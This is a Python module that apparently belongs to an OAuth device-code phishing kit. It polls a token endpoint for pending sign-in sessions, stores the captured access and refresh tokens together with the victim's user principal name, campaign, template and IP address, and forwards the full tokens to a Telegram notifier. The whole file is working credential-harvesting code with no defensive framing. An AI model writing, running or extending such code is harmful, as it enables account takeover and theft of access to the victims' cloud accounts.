import threading, time, json
from oauth import poll_once, extract_upn
from config import POLL_DEFAULT, POLL_SLOWDOWN, LOG_PATH
import config
import db

def _log(entry: dict):
    with open(LOG_PATH, "a") as f:
        f.write(json.dumps({"ts": int(time.time()), **entry}) + "\n")

def _notify(user_code, tokens, upn, template="", campaign="", remote_ip=""):
    _log({"user_code": user_code, "upn": upn,
          "refresh_token": tokens.get("refresh_token", "")[:80] + "..."})
    try:
        from telegram import notify_token
        notify_token(
            user_code=user_code, upn=upn,
            template=template, campaign=campaign, remote_ip=remote_ip,
            access_token=tokens.get("access_token", ""),
            refresh_token=tokens.get("refresh_token", ""),
        )
    except Exception:
        pass

def run_poll(user_code: str, device_code: str,
             interval: int = POLL_DEFAULT, ttl: int = 900):
    deadline = time.time() + ttl
    while time.time() < deadline:
        try:
            data = poll_once(device_code)
        except Exception:
            time.sleep(interval); continue

        if "access_token" in data:
            upn = extract_upn(data["access_token"])
            with db.conn() as c:
                c.execute("""UPDATE sessions
                             SET status='success', upn=?, access_token=?,
                                 refresh_token=?, token_expires=?, raw=?
                             WHERE user_code=? AND device_code=?""",
                          (upn, data["access_token"],
                           data.get("refresh_token", ""),
                           int(time.time()) + data.get("expires_in", 3600),
                           json.dumps(data), user_code, device_code))
                row = c.execute("""SELECT template, campaign, remote_ip
                                   FROM sessions
                                   WHERE user_code=? AND device_code=?""",
                                (user_code, device_code)).fetchone()
            meta = dict(row) if row else {}
            if meta:
                _notify(user_code, data, upn,
                        meta.get("template",""), meta.get("campaign",""),
                        meta.get("remote_ip",""))
            return

        err = data.get("error")
        if err == "authorization_pending":
            time.sleep(interval)
        elif err == "slow_down":
            interval += POLL_SLOWDOWN; time.sleep(interval)
        elif err in ("expired_token","authorization_declined","bad_verification_code"):
            with db.conn() as c:
                c.execute("""UPDATE sessions SET status=?
                             WHERE user_code=? AND device_code=?""",
                          (err, user_code, device_code))
            return
        else:
            with db.conn() as c:
                c.execute("""UPDATE sessions SET status='error', raw=?
                             WHERE user_code=? AND device_code=?""",
                          (json.dumps(data), user_code, device_code))
            return

    with db.conn() as c:
        c.execute("""UPDATE sessions SET status='expired'
                     WHERE user_code=? AND device_code=? AND status='pending'""",
                  (user_code, device_code))

def spawn(user_code, device_code, interval, ttl):
    threading.Thread(target=run_poll,
                     args=(user_code, device_code, interval, ttl),
                     daemon=True).start()

def expire_stale():
    now = int(time.time())
    with db.conn() as c:
        c.execute("""UPDATE sessions SET status='expired'
                     WHERE status='pending' AND expires_at <= ?""", (now,))

def resume_pending():
    expire_stale()
    now = int(time.time())
    with db.conn() as c:
        rows = c.execute("""SELECT user_code, device_code, expires_at
                            FROM sessions
                            WHERE status='pending' AND expires_at > ?""",
                        (now,)).fetchall()
    for r in rows:
        remaining = max(1, r["expires_at"] - now)
        spawn(r["user_code"], r["device_code"], POLL_DEFAULT, remaining)
    if rows:
        print(f"[resume] re-spawned {len(rows)} poller(s)")